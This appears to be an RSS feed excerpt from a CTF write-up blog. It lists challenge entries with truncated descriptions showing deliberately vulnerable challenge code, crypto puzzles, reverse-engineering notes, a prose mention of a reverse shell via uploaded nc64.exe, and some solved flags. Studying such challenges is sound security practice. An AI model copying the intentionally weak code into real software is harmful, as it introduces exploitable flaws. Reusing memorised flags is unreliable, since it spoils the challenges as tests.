$ python3 -q &amp;gt;&amp;gt;&amp;gt; def dec_to_base(n: int, b: int) -> int: ... digits = [] ... while n: ... digits.append(n % b) ... n //= b ... return int(''.join(map(str, digits[::-1]))) ... &amp;gt;&amp;gt;&amp;gt; dec_to_base(51, 12) 43 &amp;gt;&amp;gt;&amp;gt; 4 * 12 + 3 51 So the flag is ictf{43}.</description></item><item><title>basic-file-exploit</title><link>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/basic-file-exploit/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/basic-file-exploit/</guid><description>We are given the C source code of a program that runs remotely:
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;stdbool.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;stdint.h&amp;gt; #include &amp;lt;ctype.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;sys/time.h&amp;gt; #include &amp;lt;sys/types.h&amp;gt; #define WAIT 60 static const char* flag = "[REDACTED]"; static char data[10][100]; static int input_lengths[10]; static int inputs = 0; int tgetinput(char *input, unsigned int l) { fd_set input_set; struct timeval timeout; int ready_for_reading = 0; int read_bytes = 0; if(l &amp;lt;= 0) { printf("</description></item><item><title>Bat Computer</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/bat-computer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/bat-computer/</guid><description>We are given a 64-bit binary called batcomputer:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments Reverse engineering If we use Ghidra, we will see the decompiled source code in C for the main function:
int main() { int res; int option; char password[16]; char command[76]; setup(); while(true) { while(true) { memset(password, 0, 16); printf("Welcome to your BatComputer, Batman. What would you like to do?</description></item><item><title>BatchCraft Potions</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/batchcraft-potions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/batchcraft-potions/</guid><description>We are given this website:
Static code analysis We are provided with the JavaScript source code of the web application, built with Node.js and Express JS. This is index.js:
const express = require('express'); const app = express(); const path = require('path'); const cookieParser = require('cookie-parser'); const nunjucks = require('nunjucks'); const routes = require('./routes'); const Database = require('./database'); global.db = new Database(); app.use(express.json()); app.use(cookieParser()); nunjucks.configure('views', { autoescape: true, express: app }); app.</description></item><item><title>BatchCraft Potions</title><link>https://7rocky.github.io/en/ctf/other/htb-unictf/batchcraft-potions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-unictf/batchcraft-potions/</guid><description>We are given this website:
Static code analysis We are provided with the JavaScript source code of the web application, built with Node.js and Express JS. This is index.js:
const express = require('express'); const app = express(); const path = require('path'); const cookieParser = require('cookie-parser'); const nunjucks = require('nunjucks'); const routes = require('./routes'); const Database = require('./database'); global.db = new Database(); app.use(express.json()); app.use(cookieParser()); nunjucks.configure('views', { autoescape: true, express: app }); app.</description></item><item><title>BBGun06</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/bbgun06/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/bbgun06/</guid><description>We are given a Python source code that asks for a signature. This is the main function:
def main(s): rsa = RSA(2048) user, data = parseEmail() signature = rsa.sign(user) rsa.verify(user, signature) headers = generateHeaders(rsa, signature) valid_email = headers + data sendMessage(s, valid_email + "\n\n") try: forged_signature = recieveMessage(s, "Enter the signature as hex: ") forged_signature = bytes.fromhex(forged_signature) if not rsa.verify(user, forged_signature): sendMessage(s, "Invalid signature") if different(rsa, signature, forged_signature): sendMessage(s, FLAG) except: sendMessage(s, "</description></item><item><title>BFD56</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/bfd56/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/bfd56/</guid><description>We are given the Python source code to encrypt the flag:
from secret import pt,key,block_length import random alph = "ABCDEFGHIKLMNOPQRSTUVWXYZ" def strmask(msg,mask): mask = (mask * ((len(msg)//len(mask)) + 1)) return "".join([alph[(alph.index(i) + alph.index(j)) % 25] for i,j in zip(msg, mask)]) def strunmask(msg,mask): mask = (mask * ((len(msg)//len(mask)) + 1)) return "".join([alph[(alph.index(i) - alph.index(j)) % 25] for i,j in zip(msg, mask)]) def encrypt_block(pt, indices, characters): res = [-1] * len(pt) * 2 for i,c in enumerate(pt): res[i],res[i+len(pt)] = indices[c][0],indices[c][1] ret = "</description></item><item><title>Biased Heritage</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/biased-heritage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/biased-heritage/</guid><description>This challenge is kind of a continuation of Colliding Heritage. We are provided with the server source code in Python:
#!/usr/bin/env python3 import signal from secrets import randbelow from hashlib import sha256 from Crypto.Util.number import isPrime, getPrime, long_to_bytes, bytes_to_long FLAG = "HTB{???????????????????????????????????????}" class SHA256chnorr: def __init__(self): # while True: # self.q = getPrime(512) # self.p = 2*self.q + 1 # if isPrime(self.p): # break self.p = 0x184e26a581fca2893b2096528eb6103ac03f60b023e1284ebda3ab24ad9a9fe0e37b33eeecc4b3c3b9e50832fd856e9889f6c9a10cde54ee798a7c383d0d8d2c3 self.q = (self.p - 1) // 2 self.</description></item><item><title>Biased Heritage</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/biased-heritage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/biased-heritage/</guid><description>This challenge is kind of a continuation of Colliding Heritage. We are provided with the server source code in Python:
#!/usr/bin/env python3 import signal from secrets import randbelow from hashlib import sha256 from Crypto.Util.number import isPrime, getPrime, long_to_bytes, bytes_to_long FLAG = "HTB{???????????????????????????????????????}" class SHA256chnorr: def __init__(self): # while True: # self.q = getPrime(512) # self.p = 2*self.q + 1 # if isPrime(self.p): # break self.p = 0x184e26a581fca2893b2096528eb6103ac03f60b023e1284ebda3ab24ad9a9fe0e37b33eeecc4b3c3b9e50832fd856e9889f6c9a10cde54ee798a7c383d0d8d2c3 self.q = (self.p - 1) // 2 self.</description></item><item><title>Big RSA</title><link>https://7rocky.github.io/en/ctf/other/teamitaly-ctf/big-rsa/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/teamitaly-ctf/big-rsa/</guid><description>We are given the Python source code to encrypt the flag:
from Crypto.Util.number import getPrime, getStrongPrime, bytes_to_long from sympy import factorial from random import randint from secret import flag p, q = getStrongPrime(1024), getStrongPrime(1024) def RSAgen(e = None): d = 0 if not e: while(d.bit_length() &amp;lt; 2047): e = getPrime(2047) d = pow(e, -1, (p-1)*(q-1)) else: d = pow(e, -1, (p-1)*(q-1)) return (p*q, p, q, e, d) n = p*q print(f'{n = }') key = RSAgen() k = randint(600, 1200) f = factorial(k) leak = (pow(key[3], 2) + (key[3]*key[4] - 1)*f)*getPrime(256) + k # 2048 bit e is very expensive, i should use standard e for my encryption key = RSAgen(65537) e = key[3] flag = bytes_to_long(flag) c = pow(flag, e, n) print(f"</description></item><item><title>BitsNBytes</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/bitsnbytes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/bitsnbytes/</guid><description>We are given two PNG images called intercepted.png and original.png:
$ file intercepted.png intercepted.png: PNG image data, 775 x 550, 8-bit/color RGB, non-interlaced $ file original.png original.png: PNG image data, 775 x 550, 8-bit/color RGB, non-interlaced Both images look the same visually:
But they are different because their MD5 hashes do not coincide:
$ md5sum intercepted.png 88e9b5b97e4a615f1aa26d11dbcdec0d intercepted.png $ md5sum original.png 04e2562c19e680b6493b2a31d65c51e3 original.png Hence, we might think that there is some kind of steganography being used on intercepted.</description></item><item><title>Bizz Fuzz</title><link>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/bizz-fuzz/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/bizz-fuzz/</guid><description>We are given a 32-bit binary called vuln:
Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) We do not have the source code of the binary, and it is stripped:
$ file vuln vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=836e2f666bd53c2307bff4801d330e444556a006, stripped Reverse engineering Reversing the binary will be more challenging because we do not have the names of the functions.</description></item><item><title>Blackbox</title><link>https://7rocky.github.io/en/ctf/ctflearn/binary/blackbox/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/binary/blackbox/</guid><description>We are given a server to connect using SSH. There is a binary called blackbox that is SGID:
blackbox@ubuntu-512mb-nyc3-01:~$ ls -l total 16 ---x--s--x 1 root blackbox_pwn 8936 Jan 31 2019 blackbox -r--r----- 1 root blackbox_pwn 33 Oct 9 2017 flag.txt blackbox@ubuntu-512mb-nyc3-01:~$ file blackbox blackbox: setgid executable, regular file, no read permission As it can be seen, we have no read permission, so we cannot transfer the file to our machine, or decompile it, or debug it.</description></item><item><title>Blacksmith</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/blacksmith/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/blacksmith/</guid><description>We are given a 64-bit binary called blacksmith:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments If we open it in Ghidra, we will see this main function:
void main() { size_t length; long in_FS_OFFSET; int answer; int option; char *message_1; char *message_2; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); setup(); message_1 = "You are worthy to carry this Divine Weapon and bring peace to our homeland!</description></item><item><title>Blind</title><link>https://7rocky.github.io/en/ctf/other/ecsc-2023/blind/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/ecsc-2023/blind/</guid><description>Is this what people mean by &amp;ldquo;message blinding&amp;rdquo;?
Challenge contributed by CryptoHack
Challenge files:
output.txt blind.sage Source code analysis We are given a large SageMath script that uses ECDSA to sign the key to encrypt the flag (actually, a key used to derive an AES key with bcrypt.kdf):
def encrypt_flag(): k = secrets.token_bytes(k2//8) key = bcrypt.kdf(k, b"ICC_CHALLENGE", 16, 31337) cipher = AES.new(key, AES.MODE_CTR, nonce=b"") with open("flag.txt", "rb") as f: flag = f.</description></item><item><title>BlinkerFluids</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/blinkerfluids/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/blinkerfluids/</guid><description>We have a website where we can write Markdown and transform the document to PDF:
By default, we have this Markdown content:
As we have a Node.js project, if we read package.json we can see the versions of the third-party dependencies:
{ "name": "blinker-fluids", "version": "1.0.0", "description": "", "main": "index.js", "scripts": { "start": "node index.js" }, "keywords": [], "author": "rayhan0x01", "license": "ISC", "dependencies": { "express": "4.17.3", "md-to-pdf": "4.1.0", "nunjucks": "3.2.3", "</description></item><item><title>bloat.py</title><link>https://7rocky.github.io/en/ctf/picoctf/reverse-engineering/bloat.py/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/reverse-engineering/bloat.py/</guid><description>We are given a Python script called bloat.flag.py:
import sys a = "!\"#$%&amp;amp;'()*+,-./0123456789:;&amp;lt;=&amp;gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ"+ \ "[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~ " def arg133(arg432): if arg432 == a[71]+a[64]+a[79]+a[79]+a[88]+a[66]+a[71]+a[64]+a[77]+a[66]+a[68]: return True else: print(a[51]+a[71]+a[64]+a[83]+a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+\ a[81]+a[67]+a[94]+a[72]+a[82]+a[94]+a[72]+a[77]+a[66]+a[78]+a[81]+\ a[81]+a[68]+a[66]+a[83]) sys.exit(0) return·False def arg111(arg444): return arg122(arg444.decode(), a[81]+a[64]+a[79]+a[82]+a[66]+a[64]+a[75]+\ a[75]+a[72]+a[78]+a[77]) def arg232(): return input(a[47]+a[75]+a[68]+a[64]+a[82]+a[68]+a[94]+a[68]+a[77]+a[83]+\ a[68]+a[81]+a[94]+a[66]+a[78]+a[81]+a[81]+a[68]+a[66]+a[83]+\ a[94]+a[79]+a[64]+a[82]+a[82]+a[86]+a[78]+a[81]+a[67]+a[94]+\ a[69]+a[78]+a[81]+a[94]+a[69]+a[75]+a[64]+a[70]+a[25]+a[94]) def arg132(): return open('flag.txt.enc', 'rb').read() def arg112(): print(a[54]+a[68]+a[75]+a[66]+a[78]+a[76]+a[68]+a[94]+a[65]+a[64]+a[66]+\ a[74]+a[13]+a[13]+a[13]+a[94]+a[88]+a[78]+a[84]+a[81]+a[94]+a[69]+\ a[75]+a[64]+a[70]+a[11]+a[94]+a[84]+a[82]+a[68]+a[81]+a[25]) def arg122(arg432, arg423): arg433 = arg423 i = 0 while len(arg433) &amp;lt; len(arg432): arg433 = arg433 + arg423[i] i = (i + 1) % len(arg423) return "</description></item><item><title>Bon-nie-appetit</title><link>https://7rocky.github.io/en/ctf/htb-challenges/pwn/bon-nie-appetit/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/pwn/bon-nie-appetit/</guid><description>We are given a 64-bit binary called bon-nie-appetit:
Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: b'./' Moreover, we also have the binary patched with the remote Glibc library and loader:
$ ldd bon-nie-appetit linux-vdso.so.1 (0x00007fff11ae1000) libc.so.6 =&amp;gt; ./glibc/libc.so.6 (0x00007f96fdaab000) ./glibc/ld-linux-x86-64.so.2 =&amp;gt; /lib64/ld-linux-x86-64.so.2 (0x00007f96fe0a1000) $ ./glibc/ld-linux-x86-64.so.2 ./glibc/libc.so.6 GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.5) stable release version 2.27. Copyright (C) 2018 Free Software Foundation, Inc.</description></item><item><title>Box</title><link>https://7rocky.github.io/en/ctf/imaginaryctf/box/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/imaginaryctf/box/</guid><description>We are given this Python source code that encrypts the flag:
from Crypto.Util.number import bytes_to_long flag = open("flag.txt", "rb").read().strip() TABLE = [ lambda a, b: f"({a}+{b})", lambda a, b: f"({a}-{b})", lambda a, b: f"({a}*{b})", ] def build_box(s: bytes): e = "(x)" for b in s: e = TABLE[b % len(TABLE)](e, b) return eval(f"lambda x: {e}") box = build_box(flag) ct = box(bytes_to_long(flag)) print(ct) print(box(1337)) print(box(0x1337)) """ Output: 5545457088879574964209613711409478327714366805681091501255101702161458272094830554232779120250 3011454617406654839679120250 10002638090931457241529120250 """ It is a strange way to encrypt a message.</description></item><item><title>Brainy's Cipher</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/brainys-cipher/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/brainys-cipher/</guid><description>We are given this text file (brainy.txt):
++++++++++[>+>+++>+++++++>++++++++++&lt;&lt;&lt;&lt;-]>>>>+++++++++++++++++++++++.-----------.&lt;------------.---.++.---------.+.++.-.++.+.-----.++..++++.--.++++.+..-------.+.+++.---.+.+++++.-------.+.---.+++++++.+.-------..+++.-.+++++.-------.++.+++++.-----.+++++..-----.--.++++++++.-------.--.++++.+++.---.++..+++.------.+++.--.-..++++++.-.----..+++++.------.++++++.---.---.--.+++.++++.-------.+++++..-.++..-------.++++++.---.++..+++.----.++++.-------.++++++++..----.+++.+.------.--.-.++.-.+++++.--..--.++++.-.++++.---.------.+++++.++.+.---.+++.---.----.++++.--.+++.-----.+++++.+.---.--.+++++++.---.---...---.+.++++++++.----.++++.-----.++.--.-.--.++.-.-.+++++.--..+++++.-------.-.++++.++.-----.++++++.--------.+++.+++.-.+++.----.----.++++++.----.++++++.-------.-----.>+.&lt;++++++++++++++.---------.+.++++++.--------.++.+++++++.--------.+++++++.----.+.----.+++...----.++++..++.----..+++.+++.-----.++++.--.++..-------.+++.++++.--.---.--.++++++..-----..+++++++.-------.+++++++.--------..++++++.++.--..++.----.+++.++.------.++++.+.-..+.+.-------.++++++.-.---.---.-.++++++++..-----.---.++.+.++..-.--.+++.++++.--..------.++++++++.-------.+++++++..---.+.++..---.----.+.++++++..-.-.-----.--.++++.--.+++++++.----.++++.-----.-.+.++.+..+..--.-.---.+++++.--.--.++++++.--------.++.---.+++++++..----.---.+++++++++.-...-------.++++++++.-------.++.-.+++++.----.-.+++++.---.----.+++++.++.-----.---.+++++++.++.---------...++.+++++++.------.+++++.-------.++++.-----.+++++.----.-----.>-------------.++++++++++++.&lt;++++++++++++++.-----..-.----.++++++.-..-----.++.++++++.--.----..--.++.-.++++++++.------.+..--.+++++++.------.---.++++++.----.++++++.-.++.------.++++...--.---.+++++++.--------.++++++++.----..+.----.+..---.++++++++.+.---.-.---.--.++++++++.-----.+++++.----.+.+++.------.--..+++++++++.-.---.++.----.++++.-.------.+++++.--.++.+++.-----.++.++.--..----.-.+++++++.+.----.---.+++++.+++.---.-----.+++++.------.++++++.-.----..++.+++.--.---.++.++++++.--------..+++++.+++.---.-----.++.++++++.---.+++.-.-------.++.+++.-.---.+++.---.+.++.-----.+++++++.---.--.-..++++.++.-------.++++.+.--.++++..+.+.-.---.-.--.+.+++++.--.+++.------..--.++++++++.-.------.++++.+++.-----.+.----.-----.>------------.+++++++++++++.&lt;++++++++++++++.-.---------.++++++..++.+.--.----.-.--.+++.---.++++++++..-----.+.--.--.++++++.+++.----.---.+.++.++++.------.++++++..--.----.++++..---.+++.----.--..++++++++.-.-----..---.+++++++++.---------.++++++.----.+++++.-.--.---.++++++.+.+.---------.++++++.----.++++.+++.-----.+++.--.+++.----.+++.------.++++++.----.++++++.---..------.+++++++.----.++.+.+.++.-..-------.++++++.-------.++++.---.++++.+++.-----.++++++..----.-.+++++..---.---.-..+.--.+++.---.++++.++.---.-.+++++.-..-------.++..+++.++++.----.---.++.+++++.--------.++++.+.------..+++++.---.++++++.-.------.+++.++.--.---.++.+++.-----.+++++.---.+.--.-.+++++++.+.-------.--.+++++.-----..+++++.++.---.+++++.-.--.-.----.-----.>--------------.&lt;++++++++++++++.----.----.--.+++++++.+.--------.++++++++.--..+..---.---.+++++..++.--.++.--.+.------.+++++++.-----.+++++.---.++.++.----.++.----.++.-----.+++..+++++.-----.--.+++...++.----.++++++.--------.+++++++++.--------.+.++++.+.----..++++++.-------.++..++++.--------.++++++.-.-----.++.++++.++.---.-----.++.-.+.++++.++.---.--.-.++++.-..----..+++++++.-----.++++++.---.----.--.+++++.+.--.+++++.----.++++.---.--.+.++.++.--.+.------.+.-.+++.--.---.++.--.++++++++.------.--.+++++.-.-.++++++.------.++++++.------..+++.++.------..++++.-.++..-----.++++++.--------.++.+++++.--.-----.++++++++..-.-----.+++++++.------.+++.------.++.++.-.-.+++.----.+.+++++++.---.+.++..-----.++++.--------.+++++..-.+++++..---.-.-----.++.--.+++++++++.--------.+++++.+++.----.--.+++.--..++.---.++.++++.---.-.++++.--------.+++++..------.+++++++.++.-------.+++.--..++.+.---.++++++.---------.++.+++++.--.++.++.--------.+++++++.-.---.-.++.----.+++++++.--------.++++++.------.+++++++.---.+++.--.++++.---.---..-..++.++.-.-.---.++++++..--.+++.+.----.++++.---------..++.+.+++++.---.-.+.----.+++++++.--.---.--.+..-.-.++++++.--.++++.-.+.-----.+.+++.+.----.++.++..--------.++.+++++++.--------.+++++.+..-----.--.+.++++++.--.----.+.++++++.--------.++++++++.------.--.++++++...+.-------.+++++++++.-----.+.+.----.+++.-----.++++++.+.+.--------.+++.+++++.-------.+.+++++++.--.-------.++++++++.-.------.>++++++++++++++++++++++++++. It corresponds to Brainfuck esoteric languages. If we use a tool like www.tutorialspoint.com, we can get the output:
In summary, we have:
p = 7901324502264899236349230781143813838831920474669364339844939631481665770635584819958931021644265960578585153616742963330195946431321644921572803658406281 q = 12802918451444044622583757703752066118180068668479378778928741088302355425977192996799623998720429594346778865275391307730988819243843851683079000293815051 dp = 5540655028622021934429306287937775291955623308965208384582009857376053583575510784169616065113641391169613969813652523507421157045377898542386933198269451 dq = 9066897320308834206952359399737747311983309062764178906269475847173966073567988170415839954996322314157438770225952491560052871464136163421892050057498651 c = 62078086677416686867183857957350338314446280912673392448065026850212685326551183962056495964579782325302082054393933682265772802750887293602432512967994805549965020916953644635965916607925335639027579187435180607475963322465417758959002385451863122106487834784688029167720175128082066670945625067803812970871 $p$ and $q$ seem to be parameters for an RSA cryptosystem, and $c$ must be the ciphertext. However, we need to find out what are $dp$ and $dq$.</description></item><item><title>BruXOR</title><link>https://7rocky.github.io/en/ctf/ctflearn/cryptography/bruxor/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/cryptography/bruxor/</guid><description>We are given this sequence of characters:
TCQ{rveyln'bH_varHuebcrqxetrHOXEj We are told that the encryption type is XOR, but we need to guess the key. For that purpose, we can perform a brute force attack using &amp;ldquo;XOR Brute Force&amp;rdquo; module from CyberChef. If we filter by CTFlearn, we get the key and the flag:
Flag: CTFlearn{y0u_Have_bruteforce_XOR}.</description></item><item><title>Cache Me Outside</title><link>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/cache-me-outside/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/cache-me-outside/</guid><description>We are given a 64-bit binary called heapedit and a libc.so.6 file as external library:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) RUNPATH: b'./' If we run the binary we will get a segmentation fault:
$ chmod +x heapedit $ ./heapedit zsh: segmentation fault (core dumped) ./heapedit It is configured to use Glibc at the current directory:
$ ldd heapedit linux-vdso.so.1 (0x00007ffe8397e000) libc.</description></item><item><title>Calibrator</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/calibrator/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/calibrator/</guid><description>We are given a remote instance to connect to:
$ nc 165.227.224.40 31139 [OK] Memory check [OK] Syncing filesystem [OK] Detecting sensors [OK] Module loader [OK] Reading configurations Inititing calibration process ... ┌──────────────────────────────────────────────────────────────────────┐ │┼───────────────────┼────────────────────────┼┼──────────────────────┼│ ││ XenoCal 2000 │ . ││ ││ │┼───────────────────┤ ┌─┐ x││ . . ││ ││ Iteration: 42 │ x ► └─┘ ││ x ││ │┼─────────┬─────────┤ ││ ││ ││ X:1337 │ Y:65189 │ . x ┌───┼┼───┐ ││ │┼─────────┴─────────┘ x ┌─┘ ││ └─┐ x ││ ││ .</description></item><item><title>CandyVault</title><link>https://7rocky.github.io/en/ctf/htb-challenges/web/candyvault/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/web/candyvault/</guid><description>We are given the following website:
We also have the Python source code of the server (Flask).
Source code analysis The relevant file is app.py:
from flask import Flask, Blueprint, render_template, redirect, jsonify, request from flask_bcrypt import Bcrypt from pymongo import MongoClient app = Flask(__name__) app.config.from_object("application.config.Config") bcrypt = Bcrypt(app) client = MongoClient(app.config["MONGO_URI"]) db = client[app.config["DB_NAME"]] users_collection = db["users"] @app.errorhandler(Exception) def handle_error(error): message = error.description if hasattr(error, "description") else [str(x) for x in error.</description></item><item><title>Careless Padding</title><link>https://7rocky.github.io/en/ctf/other/hitcon-ctf/careless-padding/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/hitcon-ctf/careless-padding/</guid><description>We are given the Python source code of the server:
#!/usr/local/bin/python import random import os from secret import flag from Crypto.Cipher import AES from Crypto.Random import get_random_bytes import json N = 16 # 0 -&amp;gt; 0, 1~N -&amp;gt; 1, (N+1)~(2N) -&amp;gt; 2 ... def count_blocks(length): block_count = (length-1) // N + 1 return block_count def find_repeat_tail(message): Y = message[-1] message_len = len(message) for i in range(len(message)-1, -1, -1): if message[i] !</description></item><item><title>Chainsmoker</title><link>https://7rocky.github.io/en/ctf/htb-challenges/misc/chainsmoker/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/misc/chainsmoker/</guid><description>We are given a Python script called cli.py that is intended to interact with the remote instance. Moreover, we have some Python source code that are related to Blockchain and might be running in the server.
Another file we have is bot_wallet.txt, which contains a Blockchain wallet:
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDZzN5RXgxckpaSTlaL1FYUDhkbFVDTnhwKwovSmtzYU5qY3dvbXcydmQwSFZBWEcyRmtPbm82V3VsaGZhRHNseVFYV2JjRjFQcmZoUGFPSlROMTBkQ3lSa0JrCnJ1TlA4NnRMYUFQVnYvWnJObVpxSzhxSGZBRThvaG9tbWFnRkQ2NDlpVG5lNUdyV211TWJ1N3NiYmNXcWl6RnkKVjZKOGRZRU9JQUpUTU9Ra3V3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== Finally, there&amp;rsquo;s a README.txt file that says:
The flag is located at /app/flag.txt Recognition The remote server is probably running a Flask application (notice that the response status message is in capital letters, and also the Server header):</description></item><item><title>Character Encoding</title><link>https://7rocky.github.io/en/ctf/ctflearn/cryptography/character-encoding/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/ctflearn/cryptography/character-encoding/</guid><description>We are given these characters:
43 54 46 6C 65 61 72 6E 7B 34 35 43 31 31 5F 31 35 5F 55 35 33 46 55 4C 7D Since they are numbers and letters between A and F, they seem to be ASCII characters in hexadecimal representation.
For instance, 0x43 is the code for C, 0x54 for T and 0x46 for F.
To decode all the characters, we can use the following &amp;ldquo;one-liner&amp;rdquo;:</description></item><item><title>Chase</title><link>https://7rocky.github.io/en/ctf/htb-challenges/forensics/chase/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/forensics/chase/</guid><description>We are given a PCAP file with some HTTP messages and TCP segments:
HTTP traffic If we filter by HTTP, we will see some requests and responses:
We might think that the cyber criminal found a remote file upload vulnerability and uploaded cmd.aspx and then uploaded nc64.exe to execute commands. Actually, we can see that the cyber criminal got a reverse shell on the Windows host:
At the end of the PCAP capture, we see that the cyber criminal tries to access a file named JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.</description></item><item><title>ChromeMiner</title><link>https://7rocky.github.io/en/ctf/htb-challenges/reversing/chromeminer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/reversing/chromeminer/</guid><description>We have a Discord scam website that looks like this:
C# .NET decompilation If we click in &amp;ldquo;Login&amp;rdquo; we will download a Windows executable called DiscurdNitru.exe:
$ file DiscurdNitru.exe DiscurdNitru.exe: PE32+ executable (console) x86-64 Mono/.Net assembly, for MS Windows If we analyze printable strings, we will see that the executable is compiled from C# .NET:
$ strings DiscurdNitru.exe | grep .NET .NETFramework,Version=v4.6 .NET Framework 4.6 Therefore, we can use JetBrains dotPeek to decompile the file:</description></item><item><title>Classic, yet complicated!</title><link>https://7rocky.github.io/en/ctf/htb-challenges/crypto/classic-yet-complicated/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/htb-challenges/crypto/classic-yet-complicated/</guid><description>We are given a ciphertext:
